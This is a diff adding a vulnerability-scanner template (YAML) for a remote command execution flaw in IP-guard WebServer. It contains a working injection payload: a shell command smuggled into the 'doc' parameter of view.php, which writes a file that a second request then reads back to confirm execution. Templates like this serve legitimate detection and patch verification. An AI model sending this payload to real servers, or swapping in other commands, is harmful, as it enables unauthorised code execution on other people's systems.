@@ -1,0 +1,19 @@
+id: poc-yaml-ip-guard-webserver-rce
+info:
+  name: IP-guard WebServer 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: IP-guard WebServer
+variables:
+  rand_str: random_str(16)
+  file_name: random_str(4)
+requests:
+- method: GET
+  path: /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.docx"+%26+echo+{{.rand_str}}+>+{{.file_name}}.txt+%23&page=exp&format=pdf&callback=callback&isSplit=true
+  expression: status_code == 200 && !contains(body, "<")
+- method: GET
+  path: /ipg/static/appr/lib/flexpaper/php/{{.file_name}}.txt
+  expression: status_code == 200 && contains(body, rand_str)
+transport: http
